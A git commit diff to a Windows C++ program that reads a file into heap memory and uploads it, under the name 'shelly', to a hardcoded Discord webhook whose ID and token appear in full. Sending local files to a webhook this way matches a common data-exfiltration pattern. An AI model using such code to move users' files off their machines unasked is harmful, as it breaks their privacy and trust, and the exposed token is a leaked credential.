582519a159788d65b9c7f93064a09a50880ea800
meoww <danieljo2014@outlook.com>
2023-05-23 20:49:26 +0100

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -1,5 +1,48 @@
-void uploadFileToWebhook(const std::string& filePath) {
-    HINTERNET hSession = WinHttpOpen(L"Cpione/1.0",
+HANDLE  readFileToHeap(const char* filePath, LPVOID& buffer, int& filesize) {
+    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
+
+    if (!file) {
+        return NULL;
+    }
+
+    // get size of file
+    filesize = file.tellg();
+    if (filesize < 0) {
+        file.close();
+        return NULL;
+    }
+
+    //alocated memory on heap
+    HANDLE hHeap = GetProcessHeap();
+    if (hHeap == NULL) {
+        file.close();
+        return NULL;
+    }
+
+    buffer = HeapAlloc(hHeap, 0, static_cast<SIZE_T>(filesize));
+    if (buffer == NULL) {
+        std::cout << "Failed to allocate memory on the heap." << std::endl;
+        file.close();
+        return NULL;
+    }
+
+    // Read the file data into the buffer
+    file.seekg(0, std::ios::beg);
+    file.read(reinterpret_cast<char*>(buffer), filesize);
+
+    if (!file) {
+        std::cout << "Failed to read the file." << std::endl;
+        HeapFree(hHeap, 0, buffer);
+        file.close();
+        return NULL;
+    }
+
+    file.close();
+    return hHeap;
+}
+
+void UploadFileToWebhook(const std::string& webhookURL, const std::string& filePath) {
+    HINTERNET hSession = WinHttpOpen(L"Cpoine/1.0",
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
         WINHTTP_NO_PROXY_NAME,
         WINHTTP_NO_PROXY_BYPASS,
@@ -12,29 +55,28 @@ void uploadFileToWebhook(const std::string& filePath) {
 
     HINTERNET hRequest = WinHttpOpenRequest(hConnect,
         L"POST",
-        L<WEBOHOOKOK LINK>,
+        L"/api/webhooks/1110293229930295436/e9cgbOTkpHyN6b45tRpNCTuccGiinSvQn1m_6nKkPMpmGeRDXPg_jPN1_JX3NmqDWeup",
         NULL,
         WINHTTP_NO_REFERER,
         WINHTTP_DEFAULT_ACCEPT_TYPES,
         WINHTTP_FLAG_SECURE);
 
-    
-    std::ifstream in(filePath);
-    std::stringstream buffer{};
-    buffer << in.rdbuf();
-    std::string contents(buffer.str());
 
-  
+    LPVOID pBuffer = 0;
+    int filesize;
+
+    HANDLE hHeap = readFileToHeap(filePath.c_str(), pBuffer, filesize);
+
     std::string MultipartRequestBody =
-        "--79823473247832748723478342\r\n"
+        "--1902\r\n"
         "Content-Disposition: form-data; name=\"file\"; filename=\"shelly\"\r\n"
         "Content-Type: application/octet-stream\r\n"
         "\r\n";
-    std::string finalBody = "--79823473247832748723478342--\r\n";
-    MultipartRequestBody += contents + "\r\n" + finalBody;
+    std::string finalBody = "\r\n--1902--\r\n";
+    //MultipartRequestBody += contents + "\r\n" + finalBody;
 
     const WCHAR* ContentType =
-        L"Content-Type: multipart/form-data;boundary = 79823473247832748723478342";
+        L"Content-Type: multipart/form-data;boundary = 1902";
 
 
     BOOL bResults = WinHttpAddRequestHeaders(
@@ -44,17 +86,27 @@ void uploadFileToWebhook(const std::string& filePath) {
         WINHTTP_ADDREQ_FLAG_ADD
     );
 
-     bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+    bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
         WINHTTP_NO_REQUEST_DATA,
         0,
-        MultipartRequestBody.length(),
+        MultipartRequestBody.length() + filesize + finalBody.length(),
         NULL);
 
     DWORD dwBytesWritten = 0;
-    if (bResults)
+    if (bResults) {
         bResults = WinHttpWriteData(hRequest, MultipartRequestBody.c_str(),
             MultipartRequestBody.length(),
             &dwBytesWritten);
+
+        bResults = WinHttpWriteData(hRequest, pBuffer,
+            filesize,
+            &dwBytesWritten);
+
+        bResults = WinHttpWriteData(hRequest, finalBody.c_str(),
+            finalBody.length(),
+            &dwBytesWritten);
+
+    }
 
     if (bResults) {
         WinHttpReceiveResponse(hRequest, NULL);
@@ -63,6 +115,11 @@ void uploadFileToWebhook(const std::string& filePath) {
     WinHttpCloseHandle(hRequest);
     WinHttpCloseHandle(hConnect);
     WinHttpCloseHandle(hSession);
+    // Clean up resources
+    HeapFree(hHeap, 0, pBuffer);
+
+    return;
+
 }
 
 
